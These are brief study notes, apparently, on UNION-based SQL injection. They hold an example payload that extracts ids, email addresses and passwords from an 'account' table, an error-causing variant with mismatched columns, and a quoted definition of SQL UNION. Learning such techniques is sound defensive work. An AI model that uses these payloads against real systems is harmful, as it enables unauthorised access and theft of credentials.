Example attack:
arbitrary' UNION SELECT id, email_address, password FROM account WHERE 1 = '1

Example error:
arbitrary' UNION SELECT email_address, password FROM account WHERE 1 = '1

Union definition:
"The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements. It removes duplicate rows between the various SELECT statements.
Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types."
from: https://www.techonthenet.com/sql/union.php